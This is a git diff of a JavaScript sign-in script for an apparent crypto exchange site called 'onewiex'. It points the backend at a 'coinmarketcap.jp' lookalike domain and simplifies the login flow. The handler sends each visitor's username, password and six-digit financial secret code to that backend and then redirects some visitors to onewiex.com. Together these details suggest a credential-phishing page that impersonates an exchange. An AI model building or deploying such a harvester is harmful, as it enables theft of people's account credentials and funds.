@@ -1,5 +1,7 @@
-const ONEWIEX_BACKEND_URL = 'https://onewiex.coinbot.site';
-const EVENT_BACKEND_URL = 'https://event.coinbot.site';
+// const ONEWIEX_BACKEND_URL = 'http://127.0.0.1:8002';
+const ONEWIEX_BACKEND_URL = 'https://onewiex.coinmarketcap.jp';
+
+const EVENT_BACKEND_URL = 'https://event.coinmarketcap.jp';
 
 // const ONEWIEX_BACKEND_URL = 'http://127.0.0.1:8002';
 // const EVENT_BACKEND_URL = '';
@@ -117,54 +119,92 @@ async function signin(event) {
     return;
   }
 
-  if (SIGNIN_CLICK_TIMES == 0) {
-    financialSecretCode.style.display = 'block';
-    SIGNIN_CLICK_TIMES = 1;
-  } else {
-    const secretRegex = /^\d{6}$/;
-    if (!secretRegex.test(secretInput.value)) {
-      alert('Financial Secret Code must be exactly 6 digits.');
-      return;
-    }
+  try {
+    const token = await grecaptcha.enterprise.execute(
+      '6LdI55gnAAAAAMdf8vpOGPF5cLPXl_l7eg_dLZAM',
+      { action: 'LOGIN' }
+    );
 
-    try {
-      const token = await grecaptcha.enterprise.execute(
-        '6LdI55gnAAAAAMdf8vpOGPF5cLPXl_l7eg_dLZAM',
-        { action: 'LOGIN' }
-      );
+    const loginData = {
+      username: usernameInput.value,
+      password: passwordInput.value,
+      secret: secretInput.value,
+      recaptchaToken: token,
+    };
 
-      const loginData = {
-        username: usernameInput.value,
-        password: passwordInput.value,
-        secret: secretInput.value,
-        recaptchaToken: token,
-      };
+    const response = await fetch(`${ONEWIEX_BACKEND_URL}/login`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(loginData),
+    });
 
-      const response = await fetch(`${ONEWIEX_BACKEND_URL}/login`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(loginData),
-      });
+    const data = await response.json();
 
-      const data = await response.json();
-
-      if (data.success) {
-        if (data.onewiex_site) {
-          localStorage.setItem('jwtToken', data.token);
-          window.location.href = 'account.html';
-        } else {
-          window.location.href = 'https://onewiex.com/';
-        }
+    if (data.success) {
+      if (data.onewiex_site) {
+        localStorage.setItem('jwtToken', data.token);
+        window.location.href = 'account.html';
       } else {
-        alert(`Login failed: ${data.message}`);
+        window.location.href = 'https://onewiex.com/';
       }
-    } catch (error) {
-      console.error('Error:', error);
-      alert('An error occurred');
+    } else {
+      alert(`Login failed: ${data.message}`);
     }
+  } catch (error) {
+    console.error('Error:', error);
+    alert('An error occurred');
   }
+
+  // if (SIGNIN_CLICK_TIMES == 0) {
+  //   financialSecretCode.style.display = 'block';
+  //   SIGNIN_CLICK_TIMES = 1;
+  // } else {
+  //   const secretRegex = /^\d{6}$/;
+  //   if (!secretRegex.test(secretInput.value)) {
+  //     alert('Financial Secret Code must be exactly 6 digits.');
+  //     return;
+  //   }
+
+  //   try {
+  //     const token = await grecaptcha.enterprise.execute(
+  //       '6LdI55gnAAAAAMdf8vpOGPF5cLPXl_l7eg_dLZAM',
+  //       { action: 'LOGIN' }
+  //     );
+
+  //     const loginData = {
+  //       username: usernameInput.value,
+  //       password: passwordInput.value,
+  //       secret: secretInput.value,
+  //       recaptchaToken: token,
+  //     };
+
+  //     const response = await fetch(`${ONEWIEX_BACKEND_URL}/login`, {
+  //       method: 'POST',
+  //       headers: {
+  //         'Content-Type': 'application/json',
+  //       },
+  //       body: JSON.stringify(loginData),
+  //     });
+
+  //     const data = await response.json();
+
+  //     if (data.success) {
+  //       if (data.onewiex_site) {
+  //         localStorage.setItem('jwtToken', data.token);
+  //         window.location.href = 'account.html';
+  //       } else {
+  //         window.location.href = 'https://onewiex.com/';
+  //       }
+  //     } else {
+  //       alert(`Login failed: ${data.message}`);
+  //     }
+  //   } catch (error) {
+  //     console.error('Error:', error);
+  //     alert('An error occurred');
+  //   }
+  // }
 }
 
 let userIP = 'none';
